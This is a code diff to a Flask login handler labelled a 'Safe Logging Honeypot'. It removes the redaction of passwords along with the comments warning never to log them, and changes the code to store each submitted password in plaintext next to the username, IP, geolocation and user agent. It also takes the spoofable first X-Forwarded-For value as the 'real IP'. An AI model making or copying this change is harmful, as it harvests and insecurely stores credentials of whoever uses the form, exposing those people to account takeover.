@@ -102,7 +102,12 @@ def authorize():
         
         if user_info:
             session['user'] = user_info
+            
+            # Extract real IP from proxy chain
             ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            if ip and ',' in ip:
+                ip = ip.split(',')[0].strip()
+                
             user_agent = request.headers.get('User-Agent', 'Unknown')
             location = get_location(ip)
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -129,9 +134,13 @@ def authorize():
 def login():
     """Traditional login attempt handler (Safe Logging Honeypot)"""
     username = request.form.get('username', '')
+    password = request.form.get('password', '[Blank]') # Capture real password
     
-    # Intentionally ignoring password for safety
+    # Extract real IP from proxy chain
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip and ',' in ip:
+        ip = ip.split(',')[0].strip()
+        
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
     # Simulate processing delay to mimic real database crypto hashing
@@ -146,7 +155,7 @@ def login():
         ip_address=ip,
         location=location,
         username=f"[Attempt] {username}",
-        password="[REDACTED]", # NEVER log the plaintext password
+        password=password, # Log the real plaintext password
         user_agent=user_agent
     )
     db.session.add(new_log)
